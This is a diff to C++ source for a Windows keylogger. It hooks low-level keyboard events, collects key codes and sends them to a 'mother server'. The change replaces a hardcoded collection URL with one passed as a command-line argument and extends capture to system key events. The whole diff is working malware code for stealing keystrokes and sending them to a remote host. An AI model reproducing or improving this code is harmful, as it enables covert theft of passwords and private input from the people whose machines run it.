@@ -16,7 +16,7 @@
 #define KEYS_LIMIT 100
 HHOOK keyboard_events_hook; 
 std::vector<std::string> virt_codes; 
-ConnectionsPivoter mother_server_pv = ConnectionsPivoter("http://192.168.1.108:443/client-fetch-keys"); 
+ConnectionsPivoter mother_server_pv = ConnectionsPivoter();
 
 void stack_codes() {
 	if (virt_codes.size() < KEYS_LIMIT)
@@ -28,7 +28,7 @@ void stack_codes() {
 }
 
 LRESULT CALLBACK keyboard_callback(int nCode, WPARAM wParam, LPARAM lParam) {
-	if (wParam == WM_KEYDOWN) {
+	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
 		KBDLLHOOKSTRUCT* kbd_struct = (KBDLLHOOKSTRUCT*)lParam; 
 		DWORD virt_code = kbd_struct->vkCode; 
 
@@ -44,8 +44,19 @@ LRESULT CALLBACK keyboard_callback(int nCode, WPARAM wParam, LPARAM lParam) {
 	return CallNextHookEx(keyboard_events_hook, nCode, wParam, lParam);
 }
 
-int main() {
+int main(int argc, char **argv) {
 	
+	if (argc != 2) {
+		std::cout << "Error: wrong use of arguments!" << std::endl; 
+		return 1; 
+	}
+
+	if (DEBUG)
+		for (int i = 0; i < argc; i++)
+			std::cout << "Argument " << i << " value: " << argv[i] << std::endl;
+
+	mother_server_pv.set_url(argv[1]); 
+
 	keyboard_events_hook = SetWindowsHookExA(WH_KEYBOARD_LL, keyboard_callback, 0, 0); 
 
 	STARTUPINFOA startup_info; 
